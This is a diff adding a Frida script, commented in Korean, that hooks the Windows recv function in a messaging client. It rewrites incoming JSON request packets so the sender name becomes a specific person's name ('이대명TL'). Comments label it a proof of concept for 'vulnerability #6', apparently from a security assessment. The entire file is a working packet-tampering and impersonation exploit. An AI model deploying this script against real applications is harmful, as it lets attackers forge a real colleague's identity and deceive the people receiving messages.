@@ -1,0 +1,76 @@
+// frida_snr_patch.js
+
+const recvAddr = Module.findExportByName("ws2_32.dll", "recv");
+
+if (recvAddr) {
+    Interceptor.attach(recvAddr, {
+        onEnter: function (args) {
+            // args[1]은 데이터를 담을 버퍼(Buffer) 주소입니다.
+            this.buf = args[1];
+            this.len = args[2].toInt32();
+        },
+        onLeave: function (retval) {
+            const bytesRead = retval.toInt32();
+            if (bytesRead > 0) {
+                // 버퍼에서 데이터를 읽어옵니다.
+                const buffer = this.buf.readByteArray(bytesRead);
+                const uint8Array = new Uint8Array(buffer);
+                
+                // 바이트 배열을 문자열로 변환 (UTF-8)
+                let text = "";
+                for (let i = 0; i < uint8Array.length; i++) {
+                    text += String.fromCharCode(uint8Array[i]);
+                }
+
+                // 제어 메시지(JSON 요청)가 포함되어 있는지 확인
+                if (text.includes('"type"') && text.includes('"request"')) {
+                    console.log("[*] 원본 패킷 발견:\n" + text);
+
+                    // 4바이트 BE 길이 헤더 이후의 실제 JSON 문자열 추출
+                    // [4바이트 길이][UTF-8 JSON] 구조를 파싱합니다.
+                    try {
+                        const jsonStartIdx = text.indexOf('{');
+                        if (jsonStartIdx !== -1) {
+                            const jsonStr = text.substring(jsonStartIdx);
+                            let payload = JSON.parse(jsonStr);
+
+                            // 시나리오 A: 송신자 이름 위조 (취약점 #6 검증)
+                            if (payload.type === "request") {
+                                payload["name"] = "이대명TL"; // 강제 변조
+                                console.log("[*] 송신자 이름 스푸핑 적용 완료!");
+                            }
+
+                            // 조작된 JSON으로 패킷 재조립
+                            const newJsonStr = JSON.stringify(payload);
+                            const newJsonBytes = [];
+                            for (let i = 0; i < newJsonStr.length; i++) {
+                                newJsonBytes.push(newJsonStr.charCodeAt(i));
+                            }
+
+                            // 새 길이 계산 (4바이트 Big Endian)
+                            const newLength = newJsonBytes.length;
+                            const lengthHeader = new Uint8Array(4);
+                            lengthHeader[0] = (newLength >> 24) & 0xFF;
+                            lengthHeader[1] = (newLength >> 16) & 0xFF;
+                            lengthHeader[2] = (newLength >> 8) & 0xFF;
+                            lengthHeader[3] = newLength & 0xFF;
+
+                            // 버퍼에 새 패킷 덮어쓰기 [길이 헤더] + [JSON 바이트]
+                            this.buf.writeByteArray(lengthHeader.buffer);
+                            this.buf.add(4).writeByteArray(new Uint8Array(newJsonBytes).buffer);
+
+                            // 리턴값(읽은 바이트 수)을 새 패킷 크기에 맞게 수정
+                            retval.replace(ptr(4 + newLength));
+                            console.log("[*] 변조된 패킷 전송 수립: " + newJsonStr);
+                        }
+                    } catch (e) {
+                        console.log("[-] 파싱 중 에러 발생: " + e);
+                    }
+                }
+            }
+        }
+    });
+    console.log("[*] ws2_32.dll!recv 후킹 성공. 패킷 대기 중...");
+} else {
+    console.log("[-] ws2_32.dll에서 recv 함수를 찾을 수 없습니다.");
+}
